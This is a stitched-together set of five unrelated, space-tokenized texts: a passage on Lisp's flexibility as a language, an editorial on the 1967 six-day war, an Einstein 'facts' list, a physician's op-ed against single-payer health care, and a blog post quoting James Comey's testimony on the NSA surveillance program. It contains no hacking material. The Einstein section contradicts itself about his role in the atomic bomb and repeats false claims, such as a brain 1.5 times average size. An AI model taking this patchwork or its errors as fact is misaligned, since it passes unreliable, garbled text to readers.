In the future , it is likely that Scheme will become a popular extension language , since it is small but powerful and has an officially sanctioned standard definition .
There is a myth that Lisp ( and Prolog ) are " special - purpose " languages , while languages such as Pascal and C are " general purpose " .
Actually , just the reverse is true .
Pascal and C are special - purpose languages for manipulating the registers and memory of a von Neumann - style computer .
The majority of their syntax is devoted to arithmetic and Boolean expressions , and while they provide some facilities for forming data structures , they have poor mechanisms for procedural abstraction or control abstraction .
In addition , they are designed for the state - oriented style of programming : computing a result by changing the value of variable through assignment statements .
Lisp , on the other hand , has no special syntax for arithmetic .
Addition and multiplication are no more or less basic than list operations like appending , or string operations like converting to upper case .
But Lisp provides all you will need for programming in general : defining data structures , functions , and the means for combining them .
The assignment - dominated , state - oriented style of programming is possible in Lisp , but in addition object - oriented , rule - based and functional styles are all supported within Lisp .
This flexibility derives from two key features of Lisp : First , Lisp has a powerful macro facility , which can be used to extend the basic language .
When new styles of programming were invented , other languages died out ;
Lisp simply incorporated the new styles by defining some new macros .
The macro facility is possible because Lisp programs are composed of a simple data structure : the list .
In the early days , when Lisp was interpreted , most manipulation of programs was done through this data structure .
Nowadays , Lisp is more often compiled than interpreted , and programmers rely more on Lisp 's second great flexible feature : the function .
Of course , other languages have functions , but Lisp is rare in allowing the creation of new functions while a program is running .
Lisp 's flexibility allows it to adapt as programming styles change , but more importantly , Lisp can adapt to your particular programming problem .
In other languages you fit your problem to the language ; with Lisp you extend the language to fit your problem .
Because of its flexibility , Lisp has been successful as a high - level language for rapid prototyping in such areas as AI , graphics , and user interfaces .
Lisp has also been the dominant language for exploratory programming , where the problems are so complex that no clear solution is available at the start of the project .
Much of AI falls under this heading .

ON THE seventh day Jews everywhere celebrated Israel 's deliverance from danger .
But 40 years after that tumultuous June of 1967 , the six - day war has come to look like one of history 's pyrrhic victories .
That is not to say that the war was unnecessary .
Israel struck after Egypt's President Nasser sent his army into the Sinai peninsula , evicted United Nations peacekeeping forces and blockaded Israeli shipping through the Gulf of Aqaba .
Israel 's victory opened the waterway and smashed its enemies ' encircling armies , averting what many Israelis sincerely expected to be a second Holocaust .
And yet , in the long run , the war turned into a calamity for the Jewish state no less than for its neighbours .
But you never phoned
Part of the trouble was the completeness of the triumph .
Its speed and scope led many Israelis to see a divine hand in their victory .
This changed Israel itself , giving birth to an irredentist religious - nationalist movement intent on permanent colonisation of the occupied lands ( see article ) .
After six days Israel had conquered not just Sinai and the Syrian Golan Heights but also the old city of Jerusalem and the West Bank — the biblical Judea and Samaria where Judaism began .
In theory , these lands might have been traded back for the peace the Arabs had withheld since Israel 's founding .
That is what the UN Security Council proposed in Resolution 242 .
But Israelis were intoxicated by victory and the Arabs paralysed by humiliation .
The Arabs did not phone to sue for peace and Israel did not mind not hearing from them .
Instead , it embarked on its hubristic folly of annexing the Arab half of Jerusalem and — in defiance of law , demography and common sense — planting Jewish settlements in all the occupied territories to secure a Greater Israel .
The six - day war changed the Palestinians too .
They had been scattered by the fighting that accompanied Israel 's founding in 1948 .
Some fled beyond Palestine ; others became citizens of the Jewish state or lived under Egypt in Gaza and Jordan in the West Bank .
The 1967 war reunited them under Israeli control and so sharpened their own thwarted hunger for statehood .
When , decades later , Egypt and Jordan did make peace with Israel , the Palestinians did not recover Gaza and the West Bank .
This has left some 4 m Palestinians desperate for independence but in a confined land choked by Jewish settlements — along with the fences , checkpoints and all the hardships and indignities of military occupation .
Ariel Sharon , it is true , dragged Israel out of the Gaza Strip two years ago .
But so what ?
The Palestinians will not consider peace unless they get the West Bank and Arab Jerusalem too .
And Hamas , the Islamists who now run what passes for a Palestinian government , says it will not make a permanent peace even then .
Is there a way out ?
Yes : but making peace will take courage , and too much of the energy that should have gone into peacemaking has been squandered on the blame game .
There is , admittedly , plenty of blame to go round .
What right had the British , in 1917 , to promise the Jews a national home in Palestine ?
Why did the Palestinians reject partition in 1947 ?
Why did Israel colonise the territories after 1967 ?
Why did the Americans let Israel get away with it ?
Why did the Arab states leave the refugees to fester in camps ?
The Palestinians are terrorists , Zionism is racism , Israel 's enemies are anti-Semites .
Yasser Arafat should have accepted Israel 's “ generous offer ” at Camp David in 2000 .
But , hang on , Israel 's offer was not so generous ...
And so the quarrel spins , growing more bitter with each revolution and spreading far beyond the Middle East .
What started as a national struggle between two peoples for one land is gradually , and often wilfully , being transformed into a war of religion , feeding poison into the wounded relations between Islam and the West as a whole .
It is scandalous that the occupation has persisted since 1967 .
This conflict should have been resolved long ago , and its continuation is an indictment of all involved , from the warring parties for their intransigence , to regional powers that have exploited the Palestinian cause for self interest , to the great powers for their lack of sustained attention .
It should end — but how ?
It 's not rocket science
The answer has been obvious at least since 1937 , when a British royal commission under Lord Peel reported that “ an irrepressible conflict ” had arisen between the Arabs and Jews of Palestine and that the country would have to be partitioned .
More recently , the manner of the division has become obvious too .
Despite all Israel 's settlements , demography and justice still point to a border based on the pre-1967 lines , with minor adjustments of the sort Bill Clinton suggested in 2000 .
As Mr Clinton 's failure at Camp David demonstrated , securing agreement for such a deal will be hard .
The Clinton solution would require Israel to give up the bulk of its settlements in the West Bank , uproot a great many more settlers than it did in Gaza and share sovereignty over Jerusalem .
The Palestinians would have to accept that most refugees would “ return ” not to their homes of 60 years ago inside Israel but to a new state in the West Bank and Gaza .
Such compromises will hurt .
But for either side to give less and demand more will merely tip the difficult into the impossible .
Right now both continue to offer too little and demand too much .
Israel has at least abandoned the dream of a Greater Israel that bewitched it after the great victory of 1967 .
The illusion that the Palestinians would fall into silence has been shattered by two intifadas and every rocket Hamas fires from Gaza .
Israel 's present government says it is committed to a two - state solution .
But it is a weak government , and has lacked the courage to spell out honestly the full territorial price Israelis must pay .
The Palestinians have meanwhile gone backwards .
If Hamas means what it says , it continues to reject the idea that Jews have a right to a national existence in the Middle East .
What self - defeating madness .
For peace to come , Israel must give up the West Bank and share Jerusalem ; the Palestinians must give up the dream of return and make Israel feel secure as a Jewish state .
All the rest is detail .

Albert Einstein Facts Infographics
Einstein Was Not Only a Great Scientist but an All Rounder
The first of our Albert Einstein facts is the most well - known : Einstein was a genius – most notably in the field of science , where he contributed much to the knowledge of the world , and in physics especially .
He was a great thinker in the fields of art and philosophy , as well as an accomplished violinist .
He was a believer in the power of the imagination and of curiosity – he thought that by asking questions we could go further in our pursuit of knowledge .
At school , firstly at Luitpold Gymnasium in Munich , then later the Swiss Federal Polytechnic School in Zurich , he struggled with the strict teaching style .
He learned better by following a more relaxed approach .
Einstein Was Driven by a Quest for Certainty
The next of our Albert Einstein facts reveals that behind Einstein ’s research and thoughts about the world lay a quest for certainty .
He believed strongly in the idea that there was an external world beyond our perceptions of it .
He applied his idea that absolutes existed both to science and to moral philosophy .
His goal was to discover certainty within math and science , and to attain objective morality .

Einstein Thought in Pictures and Music Einstein ’s great breakthroughs in research came from visual experiments performed inside of his head .
He would imagine mathematical equations as a series of images and use this method to figure out interconnections between things .
His theory of relativity emerged from imagining lightning striking a train , and imagining it happening at different times as the train speeds along .
He thought in music , abstract patterns and feelings , believing strongly in the power of inspiration and intuition .
Einstein Was Targeted by the Nazis Albert Einstein facts show he fled to the US in 1933 after being targeted by the Nazis and labeled a ‘ Jewish scientist ’ .
His property in Germany was confiscated .
The Nazis argued that he was no genius , and that his Theory of Relativity was unimportant and plagiarised .
Einstein ended up at Princeton University where he did much of his later research .
He never left the US and was eventually declared an American citizen in 1940 .
Einstein Was a Domestic Activist Einstein was an outspoken pacifist , perhaps because of his own role in the invention of , and use of , the atomic bomb .
Appalled by the Hiroshima and Nagasaki attacks , he worked with the UN to curtail use of the bomb and to ensure it was only used as a deterrent .
In addition , he was a great proponent of civil rights , seeing the link between treatment of the Jews in Europe and the way the African - American population were treated in the US South .
Einstein Was Interested in Connections between Energy , Space and Light Einstein was interested in energy , light , space and time and possible connections between them .
He saw light as being both particles and waves .
His formula E = mc2 attempts to prove that matter and energy are different manifestations of the same substance .
Albert Einstein facts prove that acceleration and gravity are equivalent .
His areas of investigation focused on connections between space , time and energy ; wormholes ; black holes ; the possibility of time travel and the creation of the universe .
The Ideas of Einstein and Buddha Are Similar
In terms of thinking that the world is unified and that there is a link between the physical and the spiritual , Einstein ’s ideas can be compared to those of some Eastern philosophies , especially Buddhism .
Both Buddha and Einstein tested theories , but Einstein looked to the outside world for inspiration while Buddha looked within the mind itself .
While Einstein did not believe in God , he marvelled at the beauty and wonder of the structure of the world and attempted to understand it .
Einstein Invented an Eco-Friendly Fridge
One of our little known Albert Einstein facts is that he invented a special kind of refrigerator that uses green technology to prevent it from leaking toxic gases .
It had no moving parts and used compressed gases to keep items cold .
Scientists at Oxford University have reconstructed his design , as they are trying to design a fridge that uses no electricity and is environmentally friendly .
Fridges are very damaging to the environment as they work by expanding and contracting man-made greenhouse gases : Freon .
In addition , Einstein ’s studies into theories of light are used in technology for televisions .

Einstein Was Thought to Be a Bit Slow Einstein was slow to learn to talk , had a very poor memory and was unable to remember names , dates and numbers .
He found school difficult as he struggled with the pedagogical system .
He also failed his entrance exam to university .
His mind seemed to work in a different way to many other people – he thought in pictures and feelings .
He spent a long time thinking about things : things like space and time , for example .
He disliked authority and often made this obvious throughout his life .
Einstein Discovered the Universe Was Expanding but Thought It Was a Mistake
It was Einstein who first discovered the equation that shows the universe is expanding .
One of our great Albert Einstein facts is that he doubted the credibility of this and thought it was a mistake until the Hubble telescope later confirmed the theory .
He described it later as “ my greatest blunder . ”
Scientists are now working on this to try to understand the geometry of the universe : dark energy seems to be counteracting gravity , which is making the universe expand .
Einstein ’s Brain Was Kept for 20 Years after His Death
The pathologist , Thomas Harvey , who performed an autopsy on Einstein ’s body , was reported to have stolen his brain and kept it for over 20 years .
His brain was about 1.5 times the size of an average human brain .
In fact , when he was a baby , his parents were very worried by the huge size of Einstein ’s head .
Harvey kept Einstein ’s brain in a jar , measured and photographed it , divided it into blocks and put it on slides to examine more carefully .
Later researchers found his brain had thicker than usual ridges and fibres .
Einstein Had Trouble with Women Einstein had an early marriage to a woman named Marić while he was still young .
Before they were married , they had an illegitimate child , who was given up for adoption .
Einstein and Marić divorced , and Einstein then went on to marry his cousin , Elsa , but did not give up his many ladies on the side .
Einstein and Elsa had two sons together and she tolerated his infidelities .
When he won the Nobel Prize , the money he made from it went to his ex-wife , Marić , in the divorce settlement .
Einstein Became Famous with the Brownian Motion Formula Einstein first became famous for a discovery outlined in his doctorate – where he described how particles moved in a fluid .
This was known as Brownian Motion , and built on the observations of a botanist , Robert Brown .
Einstein showed the particles exist , that they have a fluctuating energy that relates to the water temperature , and that collisions between particles occur randomly .
He discovered a formula which could represent this .
Einstein Was Blamed for the Atomic Bomb
One of our more unfortunate Albert Einstein facts is that his work in physics , especially his energy calculation that E = mc2 , led to the later invention of the atomic bomb .
Einstein was certainly not involved in this research and regretted that his investigations into the link between energy , mass and speed had such powerful consequences .
A committed pacifist , he wrote to Roosevelt in 1939 , warning him that the Nazis may have discovered the bomb and that the US should accumulate their own for the possibility of retaliation .

Einstein Could Have Been President of Israel Einstein was offered the second Presidency of Israel in 1952 .
He was also assured that the position would leave him with the time and freedom to pursue his scientific research .
Einstein declined in a polite letter of thanks , on the grounds that he was getting old and he had no real aptitude for dealing with people .
He also said the position would mean that he had to assume the moral responsibility for the decisions of others , which he felt he could not do .
Einstein ’s Image Has Become Iconic Einstein is known for his crazy hair and slightly rumpled appearance .
His image is instantly recognisable to millions of people all over the world , and is widely used in advertising and popular culture .
The iconic photograph of him sticking out his tongue was taken after a photographer urged him to smile for a photo .
Albert Einstein facts show that he asked for nine copies of this picture ; one of these , which was signed , later sold at auction for $ 75,000 .
Einstein was absent minded , hated to wear socks and loved smoking a pipe .
There Is an Einstein Statue in Washington A statue , by Robert Berks , showing Einstein holding papers covered in mathematical equations , was erected in the Washington DC National Academy of Science in 1979 .
It is a bronze sculpture , measuring 12 feet high , and weighing about 4 tons .
Below the statue is a bench featuring three quotes about truth , freedom and the beauty of the world , and a star map representing the universe .
Einstein Died at Princeton Einstein died one year after his wife , in April of 1955 .
He died of internal bleeding stemming from a ruptured aneurysm , in hospital at Princeton .
He was 76 years old .
He muttered some final words , but the nurse who was with him did n’t speak German so these are lost in time .
An autopsy was performed on his body , at which point his brain was famously removed , and he was then cremated .
His ashes were scattered near a river in New Jersey .
The Theory of Relativity Was Auctioned to Help the War Effort Einstein auctioned off a handwritten copy of the Theory of Relativity along with a previously unpublished paper for six million dollars in 1940 to help raise money for the war effort .
Other papers of his have been sold at auction , including letters on subjects ranging from his thoughts on God , McCarthyism , the Nazis and his personal life .
These various letters and papers have reached prices ranging from $ 30,000 to $ 400,000 .
Einstein Predicted the Movement of Atoms at Different Temperatures Another scientist , Satyendra Nath Bose , had been investigating light and the properties of photons .
He could not get his work published , however , until he collaborated with Einstein .
Einstein took this research further , applying it to atoms and how they would behave in a gas .
Einstein ’s equations predicted the movement of atoms at different temperatures .
He found that at very low temperatures , the atoms coalesce into a single blob like a super atom .

Within the past few years I have read repeatedly in the opinion sections of newspapers the call for the federal government to provide a " single payer " system for America 's medical care .
These proposals are classics of left - wing thinking  they work out beautifully in the heads of those doing the proposing .
The comedy occurs when they are subjected to the scrutiny of reality ; the tragedy when they become reality .
Government involvement in medicine exacerbates rather than alleviates its ills .
HMOs and the government are pre-paid systems that are the cause of the financial crisis facing health care ( I mean in addition to the contribution of greedy lawyers and irrational juries ) .
A caller on a talk show recently commented : " The rest of the world has a one - payer government system , so why do n't we ? "
The answer : Because then we 'll have the same quality of care of the rest of the world .
Socialized medical care is a disaster worldwide for patients who need attention now or tomorrow or by next week , especially if that attention entails a procedure or surgery .
I offer the perspective of a practitioner who has lived through the changes in the system .
The cost of health care has increased alarmingly during the decades of my career because of third - party payer systems : HMOs and the government .
Health care costs will increase and quality decrease with every increase in government involvement .
The working citizen pays for health care regardless of the system : entirely government , entirely private , or HMO .
Therefore , we the people should have access to the most efficient system possible , " efficient " meaning the most cost - effective and most free in terms of the patient ’s right to choose .
It 's a happy coincidence that such a system would also be the most health - efficient ( health - promoting ) and most fair  the best plan from both moral and practical standpoints .
In the HMO system , the patient has turned over to the HMO  or rather the employer has done so for the employee - patient  what would have been the employee 's larger salary .
That is , the employee pays by forgoing a larger salary or another benefit .
That 's because employers are not in the business of printing money .
They can pay the employee one way or another , but not both .
The HMO must then ration care in order to make a profit  profit being a requisite for the survival of a private business .
The employee , the patient , is naturally motivated to squeeze what he or she can from the third - party payer .
Under a " single payer " system ( rhetorical code for federal socialized medicine ) , the citizen pays through taxes .
Government and HMO are third - party , pre-paid payers .
The patient 's position is , under those two systems , " I have already paid , so I want only the most and the best  and today . "
That demand is independent of medical need , independent of fairness , and independent of any thought about the effect on overall cost .
That 's all natural ; it is not a reflection of sinister attitude .
Under a pre-paid system , seeking attention for trivialities or requesting a sub- specialist for a problem that can be handled quite competently by a physician 's assistant or a nurse - practitioner is only natural .
Thirty years of experience have led me to the following conclusions on how to solve existing problems of health care and forestall new ones .
Under a sensible  meaning private  plan , the patient can go anywhere he or she wants .
Private insurance is " third party , " but it is a mutually voluntary contract negotiated to cover whatever the patient selects and pays for .
The patient 's premiums depend upon  or should depend upon  his or her life - style .
That is , the cost to the patient of the protection from medical expenses should depend on the patient 's health habits , and his or her premiums should be adjusted accordingly .
The patient can request and pay for all the benefits and " rights " he or she chooses , from catastrophic to weekly drop-ins for reassurance .
Catastrophic would be the least expensive , weekly visits the most expensive .
The patient would be free to go to a sub - specialist at any time for any problem that could be handled quite handsomely at the primary - care office .
But the patient usually would not , since the cost will be multiples of the cost of primary - care , and the patient will pay this out of pocket or his or her premiums will rise accordingly .
Under a sane system , instead of pressuring the doctor for an expensive procedure under the slightest pretext , the patient would ask what the chances are of this procedure ( say an MRI ) being positive .
When the doctor answers , " Approximately five percent , " then the patient will respond , " Then I 'll take your suggestions for treatment and get back with you if any of the symptoms or criteria you listed occur . "
The numerically most significant ( the most common ) killers are diseases that are by and large self - inflicted  caused by lifestyle .
The vast majority of cardiovascular disease ( heart disease , stroke , peripheral vascular disease ) , and a significant amount of ( and perhaps most ) cancer , kidney disease , osteoporosis and large - joint arthritis are self - inflicted by smoking , dietary malfeasance , obesity , lack of exercise , alcohol and other substance abuse , and by their resultant , intermediate disorders  hypertension , hyperlipidemia ( blood fats , including cholesterol ) , and diabetes ( 90 % of diabetics have the self - inflicted Type 2 , which is exclusive to overweight people ) .
Not only life - threatening diseases are self - inflicted .
Numerous others less deadly but as costly in lost productivity and needless suffering are also , including disorders of the gallbladder , back  muscular and spinal  and those transmitted sexually .
If you believe people with bad health - habits are motivated by longevity , you are clearly someone with good health habits .
People with bad habits are motivated only by cost .
If we reward people for irresponsible behavior we reap a bumper harvest of irresponsible behavior .
Paying people ( by a " third - party " system ) to continue their bad health habits negates any potential motivation to live healthfully .
When we physicians bring up the subject of making crucial changes in behavior , most patients who live unhealthfully listen with the face of the deer whose eyes are fixed on the headlights ; they look at us  or respond  with the thought , " If this guy does n't quit hassling me about the way I live , I 'm going to switch to a real doctor who will cut out the prevention noise and give me my pills . "
Why live healthfully when you get pre-paid care and can take free or subsidized medications ?
The HMO and government systems serve as " enablers " by rewarding and subsidizing those bad habits , thus reinforcing them .
The employee who lives responsibly pays for the expenses of his or her fellow employee who lives irresponsibly by foregoing what would have been a bigger salary but was withheld so that the employer can pay the HMO for the care of the irresponsible .
This increases costs both by the exacerbation of the illnesses , and by patients ' tendencies to abuse the prepaid system .
Six to twelve times per day at the clinic where I work in Ventura - Oxnard , California I hand out to obese patients a copy of my one - page detailed diet protocol : physical work - out daily , low - fat , high - fiber diet including just say no to the cheeseburgers and other fast foods .
Regularly another patient comes in to announce that his or her insurance no longer covers the cost of prescription drugs .
" Therefore , may I have another copy of the diet and exercise protocol you gave me last year ? "
Translation : " As soon as I exited your clinic last year I dumped your guide in the trash .
Now that I have to pay for my medicines , I believe I just might be interested after all in getting rid of my diabetes , my high blood pressure , and my [ go down the list ] . "
I recall suggesting to one obese couch potato that he take and live by my diet protocol .
" Those are fighting words , doctor . "
Well fine , live and die as you desire , but the idea of responsible taxpayers paying for that attitude and behavior is unfair , immoral , and counterproductive in terms of health and economics .
A ) Infinite and arbitrary demand because of third - party payer , and B ) just as arbitrary bureaucratic rationing to control the resulting mushroom cloud of costs  these are the reasons Medicare 's budget is ( adjusted for inflation ) , let 's see , about twelve or fifteen times that predicted by its founders , and would be much worse if it were not for bureaucratic restrictions placed upon the patient  call that the deletion of the patient 's freedom .
These faults would increase geometrically under a government system - for - all because of infinite demand and ever - expanding bureaucracy to deal with the inevitable rationing .
The only effective approach is a system in which the doctor can say , " Mr. Lipidus , are n't you tired of paying $ 5 or $ 10 per pill ?
Are n't you tired of your insurance premiums going up annually because of your medical - care outlay ?
If you will eat properly and exercise daily as we discussed , you probably wo n't need these pills at all , and you certainly wo n't require this frequency of office - visits and hospital admissions , and your premiums are going to plummet . "
I have never heard this crucial factor in the cost of medical care discussed on Capitol Hill .
Genuine reform would provide that a patient ’s pay - in per year would depend on his or her habits  automobile insurance style .
In the movie As Good as It Gets ( I do n't recall the names of the characters , so we 'll call them Jack Nicholson and Helen Hunt ) , Jack has funded a rescue of Helen 's asthmatic eight - year - old son from the " greedy " restrictions of the " evil " corporate HMO .
Helen makes a disgusted reference to the HMO , to which the audience responds with spirited approbation for her sentiments and derision for the HMO .
HMOs were resorted to by employers as a means of controlling costs , which is to say rationing under the euphemism of " managed care . "
It 's private socialism , so to speak and it's the wrong approach since it costs the patient his or her freedom and penalizes those who live healthfully as they pay for it with smaller salaries and restricted access to care .
Let 's sing the refrain one more time : Costs should be controlled by coupling patient cost to patient behavior .
Do away with government and HMO involvement .
Provide the needy with the means to buy private insurance .
Have laws against price conspiracies and monopoly by the insurance companies .
People with unhealthy habits , now faced with high premiums and expensive pills , are going to find themselves suddenly very interested in Prevention .
Costs will plummet .
Now those with innocent bystander diseases such as asthma ( except that some asthmatics smoke ; no , I 'm not kidding ) will not have to call upon Jack to bail them out .
California 's Medi-Cal program is a huge microcosm  a paradox that helps make the point  of the bane of federal involvement in medicine .
The average wait for a patient at the clinic where I work is about 90 minutes and is often several hours because the waiting room is overrun with Medi-Cal moms bringing in their children with stuffy noses and stubbed toes .
Whenever I see two or three charts waiting at the same treatment - room door , I know it 's a Medi -Cal family .
One of the kids seems sick , so why not bring in all the kids ?
Another of them had a touch of diarrhea a few days ago .
Still another bruised his knee last week .
Bringing one ?
Bring them all .
Why not ?!
Service is " free . "
Demand skyrockets .
To compound the tragi-comedy , Medi-Cal is rife with ridiculous and costly rules .
Government further escalates the cost of medical care as bureaucrats require procedures for those who do n't need them .
If the primary - care physician wants a $ 150 referral to a specialist , the rules dictate that a $ 1000 MRI is required in advance , when part of the point of the referral was to obtain the specialist 's agreement that the MRI is not needed .
With unlimited demand and irrational rules , no wonder it takes several weeks for the patient to reach the specialist she should have seen within a day or three of the referral .
How are costs of demand and diktat to be controlled ?
Here 's how : by the arbitrary rationing of those same bureaucrats , who place restrictions on procedures for those who do need them .
Welcome to the land of buronic wisdom .
How does the new plan to have Medicare pay for the pharmacy costs of seniors affect a young working couple ?
Let 's suppose he is a heating - air conditioning specialist and she the manager of a store , both living responsibly and healthfully and doing their best to raise a child or two .
Along comes the government and confiscates their income to pay for the $ 5 per pill medicines for a well - to - do 68 - or 78 - year - old who refuses to cure his diabetes , or to give up his cigars , or to walk from tee to green at the country club , or even to use the exercise room on the cruise ship .
Nice going , government !
How 's that for social justice ?
The same principles hold if the patient with bad habits , instead of enjoying a cruise , is on Medicaid or Medi-Cal .
The system is just as pragmatically backward and morally reprehensible whether the one who refuses to change his or her habits is rich or poor .
This subsidy of destructive habits , this enabling and rewarding those who choose not to live healthfully , is grossly unfair to those who live responsibly  who live healthfully .
It escalates demand ; it escalates costs .
In short , it is counterproductive in every respect of health and cost .
The third - party payer system is a disaster for everyone concerned except for HMOs and politicians who derive power from citizen dependency upon government .
The more prevalent the HMO or government pre-pay system , the greater the demand .
The only way a " single - payer " ( Medicare for all ) universal government system is going to control stratospheric demand and costs is rationing that will make HMOs look like a genie fulfilling your every wish .
Private medical savings accounts would beat the Medicare system in every respect .
MSAs are pro-choice : seniors would have more freedom to select their care ; they would be motivated to live healthfully , since the excess MSA money would be theirs to enjoy ; and there would be greater availability of care since demand would be determined by need as agreed to by patient and physician .
The best system for poor and marginal - income people would be state - provided vouchers or cash with which to buy private insurance .
As the recipient 's health habits improve , he or she would be allowed to keep the difference ( for a certain number of years ) as the insurance premiums decreased because of those improved health habits .
There could be decreasing coverage for every year the individual refuses to cooperate by living healthfully .
Now you 're going to see smokers , substance - abusers and couch - potatoes suddenly discovering a new life style .
This plan increases individual choice and decreases dependency on the government and will therefore be fiercely opposed by left - wing political forces , their politicians , and certain lobbies .
By financing health care through a private patient - controlled system , the cost of health care will be as high or as low as the public wants .
If the American public has a lapse of intellect and judgment serious enough to elect the politicians who want to socialize our medical care , I have a health advisory for you : get rich , or do n't get sick .
On second thought , do n't bother getting rich : there will probably be laws against going outside the system  unless , of course , you 're a member of Congress .

Comey Testifies that the President Broke the Law
Marty Lederman
Former Deputy Attorney General James Comey just completed his testimony before the Senate Judiciary Committee .
Much of the testimony concerned the inicident on March 11 , 2004 , when Comey , AG Ashcroft and AAG Jack Goldsmith ( OLC ) refused to sign off on the legality of the NSA " terrorist surveillance " program .
Unfortunately , I missed the first half of the testimony .
CSPAN did not cover it , and I 'm told that committee webcasts are not recorded !
( which seems remarkably short - sighted ) .
But Paul Kiel 's very helpful summary is here , and I now have a transcript of the testimony .
READ IT .
It 's just about the most dramatic testimony I can recall in a congressional committee since John Dean .
Comey testified as follows :
( i ) that he , OLC and the AG concluded that the NSA program was not legally defensible , i.e. , that it violated FISA and that the Article II argument OLC had previously approved was not an adequate justification ( a conclusion prompted by the New AAG , Jack Goldsmith , having undertaken a systematic review of OLC 's previous legal opinions regarding the Commander in Chief 's powers ) ;
( ii ) that the White House nevertheless continued with the program anyway , despite DOJ 's judgment that it was unlawful ;
( iii ) that Comey , Ashcroft , the head of the FBI ( Robert Mueller ) and several other DOJ officials therefore threatened to resign ;
( iv ) that the White House accordingly -- one day later -- asked DOJ to figure out a way the program could be changed to bring it into compliance with the law ( presumably on the AUMF authorizaton theory ) ; and
( v ) that OLC thereafter did develop proposed amendments to the program over the subsequent two or three weeks , which were eventually implemented .
The program continued in the interim , even after DOJ concluded that it was unlawful .
Note that Comey homself was the Acting AG at the time , with Ashcroft being in the hospital for surgery .
As the New York Times previously reported , and as Comey recounted today in remarkably dramatic detail -- set out below -- the White House ( Andy Card and Judge Gonzales ) actually attempted to have Ashcroft overrule Comey even though Ashcroft was ailing and not wielding the powers of the AG at the time .
According to Comey today : " I was angry .
I thought I had just witnessed an effort to take advantage of a very sick man who did not have the powers of the attorney general . "
Most importantly : Can anyone think of any historical examples where the Department of Justice told the White House that a course of conduct would be unlawful ( in this case , a felony ) , and the President went ahead and did it anyway , without overruling DOJ 's legal conclusion ?
Excerpt from Comey testimony :
COMEY : In the early part of 2004 , the Department of Justice was
engaged -- the Office of Legal Counsel , under my supervision -- in a
reevaluation both factually and legally of a particular classified
program .
And it was a program that was renewed on a regular basis ,
and required signature by the attorney general certifying to its
legality .
And the -- and I remember the precise date .
The program had to
be renewed by March the 11th , which was a Thursday , of 2004 .
And we
were engaged in a very intensive reevaluation of the matter .
And a week before that March 11th deadline , I had a private
meeting with the attorney general for an hour , just the two of us , and
I laid out for him what we had learned and what our analysis was in
this particular matter .
And at the end of that hour - long private session , he and I agreed
on a course of action .
And within hours he was stricken and taken
very , very ill ...
SCHUMER : ( inaudible )
You thought something was wrong with how it
was being operated or administered or overseen .
COMEY : We had -- yes .
We had concerns as to our ability to
certify its legality , which was our obligation for the program to be
renewed .
The attorney general was taken that very afternoon to George
Washington Hospital , where he went into intensive care and remained
there for over a week .
And I became the acting attorney general .
And over the next week -- particularly the following week , on
Tuesday -- we communicated to the relevant parties at the White House
and elsewhere our decision that as acting attorney general I would not
certify the program as to its legality and explained our reasoning in
detail , which I will not go into here .
Nor am I confirming it's any
particular program .
That was Tuesday that we communicated that .
COMEY : The next day was Wednesday , March the 10th , the night of
the hospital incident .
And I was headed home at about 8 o'clock that
evening , my security detail was driving me .
And I remember exactly
where I was -- on Constitution Avenue -- and got a call from Attorney
General Ashcroft 's chief of staff telling me that he had gotten a
call ...
SCHUMER : What 's his name ?
COMEY : David Ayers .
That he had gotten a call from Mrs. Ashcroft from the hospital .
She had banned all visitors and all phone calls .
So I had n't seen him
or talked to him because he was very ill .
And Mrs. Ashcroft reported that a call had come through , and that
as a result of that call Mr. Card and Mr. Gonzales were on their way
to the hospital to see Mr. Ashcroft .
SCHUMER : Do you have any idea who that call was from ?
COMEY : I have some recollection that the call was from the
president himself , but I do n't know that for sure .
It came from the
White House .
And it came through and the call was taken in the
hospital .
So I hung up the phone , immediately called my chief of staff ,
told him to get as many of my people as possible to the hospital
immediately .
I hung up , called Director Mueller and -- with whom I'd
been discussing this particular matter and had been a great help to me
over that week -- and told him what was happening .
He said , " I'll
meet you at the hospital right now . "
Told my security detail that I needed to get to George Washington
Hospital immediately .
They turned on the emergency equipment and
drove very quickly to the hospital .
I got out of the car and ran up -- literally ran up the stairs
with my security detail .
SCHUMER : What was your concern ?
You were in obviously a huge
hurry .
COMEY : I was concerned that , given how ill I knew the attorney
general was , that there might be an effort to ask him to overrule me
when he was in no condition to do that .
SCHUMER : Right , OK .
COMEY : I was worried about him , frankly .
And so I raced to the hospital room , entered .
And Mrs. Ashcroft
was standing by the hospital bed , Mr. Ashcroft was lying down in the
bed , the room was darkened .
And I immediately began speaking to him ,
trying to orient him as to time and place , and try to see if he could
focus on what was happening , and it was n't clear to me that he could .
He seemed pretty bad off .
SCHUMER : At that point it was you , Mrs. Ashcroft and the
attorney general and maybe medical personnel in the room .
No other
Justice Department or government officials .
COMEY : Just the three of us at that point .
I tried to see if I could help him get oriented .
As I said , it
was n't clear that I had succeeded .
I went out in the hallway .
Spoke to Director Mueller by phone .
He was on his way .
I handed the phone to the head of the security
detail and Director Mueller instructed the FBI agents present not to
allow me to be removed from the room under any circumstances .
And I
went back in the room .
I was shortly joined by the head of the Office of Legal Counsel
assistant attorney general , Jack Goldsmith , and a senior staffer of
mine who had worked on this matter , an associate deputy attorney
general .
So the three of us Justice Department people went in the room .
I
sat down ...
SCHUMER : Just give us the names of the two other people .
COMEY : Jack Goldsmith , who was the assistant attorney general ,
and Patrick Philbin , who was associate deputy attorney general .
I sat down in an armchair by the head of the attorney general's
bed .
The two other Justice Department people stood behind me .
And
Mrs. Ashcroft stood by the bed holding her husband 's arm .
And we
waited .
And it was only a matter of minutes that the door opened and in
walked Mr. Gonzales , carrying an envelope , and Mr. Card .
They came
over and stood by the bed .
They greeted the attorney general very
briefly .
And then Mr. Gonzales began to discuss why they were there
-- to seek his approval for a matter , and explained what the matter
was -- which I will not do .
And Attorney General Ashcroft then stunned me .
He lifted his
head off the pillow and in very strong terms expressed his view of the
matter , rich in both substance and fact , which stunned me -- drawn
from the hour - long meeting we'd had a week earlier -- and in very
strong terms expressed himself , and then laid his head back down on
the pillow , seemed spent , and said to them , " But that does n't matter ,
because I 'm not the attorney general . "
SCHUMER : But he expressed his reluctance or he would not sign
the statement that they -- give the authorization that they had asked ,
is that right ?
COMEY : Yes .
And as he laid back down , he said , " But that does n't matter ,
because I 'm not the attorney general .
There is the attorney general , "
and he pointed to me , and I was just to his left .
The two men did not acknowledge me .
They turned and walked from
the room .
And within just a few moments after that , Director Mueller
arrived .
I told him quickly what had happened .
He had a brief -- a
memorable brief exchange with the attorney general and then we went
outside in the hallway .
SCHUMER : OK .
Now , just a few more points on that meeting .
First , am I correct that it was Mr. Gonzales who did just about
all of the talking , Mr. Card said very little ?
COMEY : Yes , sir .
